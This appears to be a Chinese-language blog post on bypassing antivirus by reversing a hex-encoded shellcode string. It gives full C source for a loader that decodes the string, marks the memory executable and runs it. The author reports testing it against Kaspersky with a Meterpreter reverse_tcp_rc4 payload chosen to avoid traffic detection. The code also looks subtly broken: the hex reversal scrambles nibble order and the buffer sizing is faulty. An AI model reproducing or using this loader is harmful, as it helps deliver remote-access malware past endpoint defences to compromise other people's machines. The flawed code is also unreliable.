# 反转字符串绕杀软

## 简介

我也不想写什么花里胡哨的东西，就让我水一篇吧。

就继续延用这玩意把[SimpleShellcodeInject](https://github.com/DimopoulosElias/SimpleShellcodeInjector)，我还挺喜欢用这种shellcode传入方式的，让我们在这个基础上添加功能吧。

为了节省我们的时间就随便加一个能自动化实现的shellcode混淆方式\(偷懒，手动狗头\)，就直接添加一个字符串翻转吧。

## 思路

直接python一行代码翻转字符串。

![](../.gitbook/assets/image%20%28145%29.png)

在加载器内翻转字符串。

```text
    int p = 0;

    for (int i = strlen(str) - 1; i >= 0; i--)
    {
        temp[p++] = str[i];
    }
```

然后执行老哥的ssi，这里遇到一个坑，tm的vc6根本没有malloc\(略略略\)。

然后请出我们的卡巴斯基。

![](../.gitbook/assets/image%20%28148%29.png)

虽然我们古典主义脚本小子特别喜欢弹窗\(更多时候弹calc\)，这里我们再测一下Meterpreter。

防止在流量检测的时候被杀掉，我们使用windows/meterpreter/reverse\_tcp\_rc4这个payload。

![](../.gitbook/assets/image%20%28147%29.png)

![](../.gitbook/assets/image%20%28146%29.png)

略略略。

## 代码

```text
// hex.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"




int main(int argc, char* argv[]) {

    char *str = argv[1];
    

    unsigned int char_in_hex;
    
    unsigned int iterations = strlen(str);
    unsigned int memory_allocation = strlen(str) / 2;

    char* temp = (char*)VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    int p = 0;

    for (int i = strlen(str) - 1; i >= 0; i--)
    {
        temp[p++] = str[i];
    }

    char* shellcode = (char*)temp;

    for (i = 0; i < iterations - 1; i++) {
        sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }


    void* exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, NULL);

    (*(void (*WINAPI)()) exec)();

    return 0;
}

```

